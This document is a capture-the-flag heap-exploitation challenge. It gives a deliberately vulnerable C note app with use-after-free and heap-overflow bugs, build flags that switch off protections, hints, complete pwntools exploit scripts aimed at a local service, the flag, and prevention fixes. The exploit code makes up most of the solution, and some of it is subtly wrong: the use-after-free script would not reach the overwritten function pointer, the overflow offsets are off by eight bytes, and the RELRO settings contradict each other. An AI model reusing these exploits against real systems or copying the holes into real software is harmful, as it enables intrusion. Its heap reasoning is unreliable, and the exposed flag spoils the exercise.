# Challenge 01 - Heap Exploitation

**Category:** Pwn (Binary Exploitation)
**Difficulty:** Advanced
**Points:** 450
**Target:** Buffer Overflow Server (nc localhost 9999)

## Challenge Description

A custom note-taking application runs on the server. The program allows users to create, edit, and delete notes - but the developer made critical mistakes in their memory management.

Your mission is to exploit heap vulnerabilities to achieve arbitrary code execution and read the flag file from the server.

## Objectives

- Understand glibc heap internals (chunks, bins, arena)
- Exploit Use-After-Free (UAF) vulnerability
- Perform heap overflow to corrupt metadata
- Achieve arbitrary write or code execution
- Read /flag.txt from the server

## Target Information

- **Service:** nc localhost 9999
- **Binary:** heap_notes (provided)
- **Architecture:** x86_64, No PIE, Partial RELRO
- **Libc:** glibc 2.31
- **Protections:** NX enabled, No stack canary

## Getting Started

1. Start the buffer overflow service:
   ```bash
   cd docker && docker-compose up -d buffer-overflow
   ```

2. Download the challenge binary and libc

3. Create the vulnerable application:

```c
/* heap_notes.c - Vulnerable Note Application */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX_NOTES 10
#define NOTE_SIZE 0x80

typedef struct {
    char *content;
    size_t size;
    void (*print_func)(char *);
} Note;

Note *notes[MAX_NOTES];
int note_count = 0;

void print_note(char *content) {
    printf("Note: %s\n", content);
}

void win() {
    system("cat /flag.txt");
}

void create_note() {
    if (note_count >= MAX_NOTES) {
        puts("Too many notes!");
        return;
    }

    Note *note = malloc(sizeof(Note));
    note->content = malloc(NOTE_SIZE);
    note->size = NOTE_SIZE;
    note->print_func = print_note;

    printf("Enter note content: ");
    read(0, note->content, NOTE_SIZE);

    notes[note_count++] = note;
    printf("Note %d created!\n", note_count - 1);
}

void edit_note() {
    int idx;
    printf("Note index: ");
    scanf("%d", &idx);

    if (idx < 0 || idx >= MAX_NOTES || !notes[idx]) {
        puts("Invalid index!");
        return;
    }

    printf("New content: ");
    // VULNERABILITY: No size check, allows heap overflow
    read(0, notes[idx]->content, 0x200);
    puts("Note updated!");
}

void delete_note() {
    int idx;
    printf("Note index: ");
    scanf("%d", &idx);

    if (idx < 0 || idx >= MAX_NOTES || !notes[idx]) {
        puts("Invalid index!");
        return;
    }

    free(notes[idx]->content);
    free(notes[idx]);
    // VULNERABILITY: Pointer not nullified - Use After Free
    puts("Note deleted!");
}

void view_note() {
    int idx;
    printf("Note index: ");
    scanf("%d", &idx);

    if (idx < 0 || idx >= MAX_NOTES || !notes[idx]) {
        puts("Invalid index!");
        return;
    }

    // VULNERABILITY: Calls function pointer (UAF exploitable)
    notes[idx]->print_func(notes[idx]->content);
}

void menu() {
    puts("\n=== Heap Notes ===");
    puts("1. Create note");
    puts("2. Edit note");
    puts("3. Delete note");
    puts("4. View note");
    puts("5. Exit");
    printf("> ");
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    int choice;
    while (1) {
        menu();
        scanf("%d", &choice);
        getchar();

        switch (choice) {
            case 1: create_note(); break;
            case 2: edit_note(); break;
            case 3: delete_note(); break;
            case 4: view_note(); break;
            case 5: exit(0);
            default: puts("Invalid choice!");
        }
    }
    return 0;
}
```

4. Compile with vulnerabilities:
   ```bash
   gcc -o heap_notes heap_notes.c -no-pie -fno-stack-protector -z norelro
   ```

---

## Hints

<details>
<summary>Hint 1 (Cost: -45 points)</summary>

The program has two main vulnerabilities:

1. **Use-After-Free (UAF)**: When a note is deleted, the pointer in `notes[]` array is NOT set to NULL. You can still view/use a freed note!

2. **Heap Overflow**: The edit function reads 0x200 bytes into a 0x80 byte buffer, allowing you to overflow into adjacent heap chunks.

The Note struct contains a function pointer `print_func`. If you can overwrite this with the address of `win()`, you get the flag!

</details>

<details>
<summary>Hint 2 (Cost: -60 points)</summary>

**UAF Exploitation Strategy:**

1. Create two notes (note0, note1)
2. Delete note0 (goes to tcache/fastbin)
3. Create a new note - it may reuse note0's memory
4. The old Note struct in notes[0] now points to content controlled by you
5. When viewing note0, it calls the function pointer you control!

**Heap Layout:**
```
Before delete:
[Note0 struct] -> [Note0 content]
[Note1 struct] -> [Note1 content]

After delete note0 and create note2:
[Note2 struct (was Note0 content)] -> [Note2 content]
[Note1 struct] -> [Note1 content]
notes[0] still points to freed Note0 struct area!
```

</details>

<details>
<summary>Hint 3 (Cost: -90 points)</summary>

Find the `win()` function address:
```bash
objdump -d heap_notes | grep win
# e.g., 0x401196 <win>
```

Exploit steps:
1. Create note0
2. Create note1
3. Delete note0
4. Create note2 with content = address of `win()` at offset 0x10 (where print_func would be)
5. View note0 - it will call your overwritten function pointer!

Pwntools exploit skeleton:
```python
from pwn import *

p = process('./heap_notes')
# p = remote('localhost', 9999)

win_addr = 0x401196  # Address of win()

def create(content):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'content: ', content)

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())

def view(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())

# Exploit
create(b'AAAA')  # note0
create(b'BBBB')  # note1
delete(0)        # Free note0, but pointer remains

# Create note2 - payload at offset where print_func sits
payload = b'A' * 0x10 + p64(win_addr)
create(payload)

view(0)  # Calls win()!

p.interactive()
```

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Analyze the Binary

```bash
# Check protections
checksec heap_notes
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# Find important addresses
objdump -d heap_notes | grep -E "(win|print_note)"
# 0x401176 <print_note>
# 0x401196 <win>
```

### Step 2: Understand the Heap Layout

The Note structure:
```c
typedef struct {
    char *content;      // offset 0x00, 8 bytes
    size_t size;        // offset 0x08, 8 bytes
    void (*print_func); // offset 0x10, 8 bytes
} Note;  // Total: 0x18 bytes, but malloc rounds up
```

When creating a note:
1. `malloc(sizeof(Note))` = malloc(0x18) -> actually allocates 0x20 chunk
2. `malloc(NOTE_SIZE)` = malloc(0x80) -> allocates 0x90 chunk

### Step 3: Exploit UAF Vulnerability

```python
#!/usr/bin/env python3
"""Heap Exploitation - Use After Free"""

from pwn import *

# context.log_level = 'debug'

# Connect to target
# p = process('./heap_notes')
p = remote('localhost', 9999)

WIN_ADDR = 0x401196

def create(content):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'Enter note content: ', content)

def edit(idx, content):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Note index: ', str(idx).encode())
    p.sendafter(b'New content: ', content)

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Note index: ', str(idx).encode())

def view(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Note index: ', str(idx).encode())

# Exploit
log.info("Creating notes...")
create(b'A' * 0x10)  # note0
create(b'B' * 0x10)  # note1

log.info("Deleting note0 (UAF setup)...")
delete(0)

# The freed Note struct chunk goes to tcache
# When we create a new note, the Note struct allocation might reuse freed chunks

log.info("Creating note2 with payload...")
# The new note's content buffer might overlap with freed note0's struct
# We need to control where print_func is
# Offset 0x10 in our content should overwrite print_func of old note0

payload = flat({
    0x00: b'/bin/sh\x00',  # Could be used as argument
    0x08: p64(0x80),       # size field
    0x10: p64(WIN_ADDR),   # print_func -> win()
})

create(payload.ljust(0x80, b'\x00'))

log.info("Triggering UAF - calling win()...")
view(0)  # This views the "deleted" note0, calling our controlled function pointer

p.interactive()
```

### Step 4: Alternative - Heap Overflow Exploitation

```python
#!/usr/bin/env python3
"""Heap Exploitation - Heap Overflow"""

from pwn import *

p = remote('localhost', 9999)
WIN_ADDR = 0x401196

def create(content):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'Enter note content: ', content)

def edit(idx, content):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Note index: ', str(idx).encode())
    p.sendafter(b'New content: ', content)

def view(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Note index: ', str(idx).encode())

# Create two notes
create(b'A' * 0x10)  # note0
create(b'B' * 0x10)  # note1

# Heap layout:
# [note0 struct (0x20)] [note0 content (0x90)] [note1 struct (0x20)] [note1 content (0x90)]

# Edit note0 with overflow into note1's struct
# Need to overflow:
# - note0 content: 0x80 bytes (+ 0x10 chunk header for next chunk)
# - note1 struct header: 8 bytes
# - note1->content pointer: 8 bytes
# - note1->size: 8 bytes
# - note1->print_func: 8 bytes <- OVERWRITE THIS

overflow = b'A' * 0x80  # Fill note0 content
overflow += p64(0x21)   # Fake chunk size (to keep heap consistent)
overflow += p64(0)      # prev_size for note1 struct
overflow += p64(0x21)   # size for note1 struct chunk

# Now we're inside note1's struct memory
overflow += p64(0x0)           # content pointer (doesn't matter)
overflow += p64(0x80)          # size
overflow += p64(WIN_ADDR)      # print_func = win!

edit(0, overflow)

# View note1 - triggers win()
view(1)

p.interactive()
```

### Understanding Heap Internals

**Chunk Structure (glibc):**
```
+-------------------+
|   prev_size       | (8 bytes, used when previous chunk is free)
+-------------------+
|   size + flags    | (8 bytes, includes PREV_INUSE, IS_MMAPPED, NON_MAIN_ARENA)
+-------------------+
|   user data       | (variable size)
+-------------------+
```

**Tcache (Thread Local Cache):**
- Fast allocation for small chunks (< 0x410 bytes in glibc 2.31)
- LIFO singly-linked list
- No security checks in older versions
- Up to 7 chunks per size class

**Exploitation Techniques:**
| Technique | Description | Requirement |
|-----------|-------------|-------------|
| UAF | Use freed memory | Missing nullification |
| Double Free | Free same chunk twice | No double-free check |
| Heap Overflow | Overflow into adjacent chunk | No bounds check |
| Tcache Poisoning | Corrupt tcache fd pointer | UAF + tcache |
| House of Force | Corrupt top chunk size | Heap overflow |
| Fastbin Dup | Duplicate fastbin entry | Double free |

### Step 5: Get the Flag

```
$ python3 exploit.py
[+] Opening connection to localhost on port 9999: Done
[*] Creating notes...
[*] Deleting note0 (UAF setup)...
[*] Creating note2 with payload...
[*] Triggering UAF - calling win()...
[*] Switching to interactive mode
FLAG{h34p_3xpl01t4t10n_m4st3r}
```

### Prevention

```c
// SECURE: Nullify pointers after free
void delete_note_secure() {
    // ...
    free(notes[idx]->content);
    free(notes[idx]);
    notes[idx] = NULL;  // Prevent UAF
}

// SECURE: Bounds checking
void edit_note_secure() {
    // ...
    read(0, notes[idx]->content, notes[idx]->size);  // Use stored size
}

// Compile with protections
// gcc -o notes notes.c -fstack-protector-strong -pie -z relro -z now
```

</details>

---

## Flag

```
FLAG{h34p_3xpl01t4t10n_m4st3r}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- Heap memory management understanding
- Use-After-Free exploitation
- Heap overflow techniques
- GDB heap analysis
- Pwntools scripting

## Tools Used

- GDB with pwndbg/gef
- pwntools
- checksec
- objdump/readelf
- ltrace

## Related Challenges

- [06 - Binary Analysis (Intermediate)](../intermediate/06-binary-analysis.md) - Reverse engineering basics
- [Kernel Exploitation (Advanced)](02-kernel-exploitation.md) - OS-level exploitation

## References

- [Heap Exploitation - GitHub](https://github.com/shellphish/how2heap)
- [glibc malloc internals](https://sourceware.org/glibc/wiki/MallocInternals)
- [Azeria Labs - Heap Exploitation](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/)
- [Tcache Exploitation](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c)
